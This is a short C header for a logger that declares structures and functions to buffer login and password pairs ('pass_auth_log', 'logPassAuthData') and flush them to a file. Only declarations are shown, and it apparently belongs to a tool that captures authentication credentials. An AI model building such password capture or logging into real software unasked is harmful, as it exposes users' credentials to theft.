#ifndef LOGGER_H
#define LOGGER_H

#define INIT_BUFFER_SIZE 0x200

typedef enum _log_identifier {
    pass_auth_log_id = 1,
    pass_entry_log_id
} log_identifier;

typedef struct _log_entry_header {
    unsigned long logType;
    unsigned long entrySize;
} log_entry_header;

typedef struct _pass_auth_log {
    unsigned long id;
    unsigned long h_length;
    unsigned char* h_login;
    unsigned char* h_pass;
} pass_auth_log;

/*
 * Write what is in the buffer into a file.
 */
void flushBuffer();

/*
 * Release memory allocated for he log buffer.
 */
void freeLogBuffer();

void logPassAuthData (
    unsigned long id,
    unsigned long h_length,
    unsigned char* h_login,
    unsigned char* h_pass);

#endif // LOGGER_H
